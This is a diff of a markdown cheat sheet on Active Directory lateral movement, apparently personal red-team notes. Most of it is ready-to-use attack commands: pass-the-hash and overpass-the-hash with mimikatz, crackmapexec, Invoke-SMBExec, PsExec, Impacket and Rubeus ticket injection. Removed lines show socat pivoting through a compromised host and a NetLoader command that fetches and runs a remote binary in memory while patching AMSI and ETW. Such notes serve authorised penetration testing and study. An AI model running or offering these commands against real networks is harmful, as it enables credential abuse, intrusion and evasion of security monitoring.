@@ -3,7 +3,6 @@
 * [Pass The Hash](#Pass-The-Hash)
   * [Overpass The Hash](#Overpass-The-Hash)
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
-* [Offensive .NET](#Offensive-.NET)
 * [Lateral Movement Techniques](#Lateral-Movement-Techniques)
   * [PSSession](#PSSession) 
   * [PSExec](#PSExec)
@@ -73,20 +72,6 @@ runas /netonly /user:<DOMAIN>\<USER> powershell.exe
 mimikatz.exe sekurlsa::pth /domain:<DOMAIN> /user:<USER> /rc4:<HASH>
 ```
 
-### Remote port forward socat Windows
-- https://netcologne.dl.sourceforge.net/project/unix-utils/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip
-- Download all dll's and executable on target
-- First hop is compromised machine
-```
-socat.exe tcp-listen:<LISTENING PORT>,tcp-connect:<TARGET IP SECOND HOP>:<TARGET PORT>
-```
-
-#### Then let it listen on our kali machine 
-- so we can connect with our windows tool for example
-```
-socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TARGET PORT>
-```
-
 ## Pass the hash
 #### Impacket
 - Use the empty lm hash ```00000000000000000000000000000000```
@@ -98,7 +83,10 @@ socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TAR
 #### Crackmapexec
 - Required elevated privileges to execute commands
 ```
-cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -X <COMMAND>
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
 ```
 
 #### Invoke-TheHash
@@ -109,10 +97,13 @@ Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Has
 ```
 
 #### Psexec
-- Seems to only work with password or after a overpass the hash attack with Mimikatz!
+- Sysinternals Psexec seems to only work with password or after a overpass the hash attack with Mimikatz!
+- Impacket: https://github.com/maaaaz/impacket-examples-windows
 ```
 .\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> -i cmd.exe
 .\PsExec64.exe \\<COMPUTERNAME> -accepteula 
+
+.\psexec_imp.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
 ```
 
 ### Overpass The Hash
@@ -147,7 +138,7 @@ Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /nowrap /ptt
 Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /nowrap /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
-### Double hop
+### Double hop issue
 #### Pssession in pssession
 ```
 Enter-PSSession -ComputerName <NAME>
@@ -179,7 +170,10 @@ enter-pssession $sess
 ## Check Local Admin Access
 #### Crackmapexec
 ```
-cme smb <COMPUTERLIST> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
 ```
 
 #### Powerview
@@ -196,18 +190,6 @@ Find-WMILocalAdminAccess
 ```
 . ./Find-PSRemotingLocalAdminAccess.ps1
 Find-PSRemotingLocalAdminAccess
-```
-
-## Offensive .NET
-- https://github.com/Flangvik/NetLoader
-- Load binary from filepath or URL and patch AMSI & ETW while executing
-```
-C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
-```
-
-#### Use custom exe Assembyload to run netloader in memory and then load binary
-```
-C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
 ```
 
 ## Lateral Movement Techniques
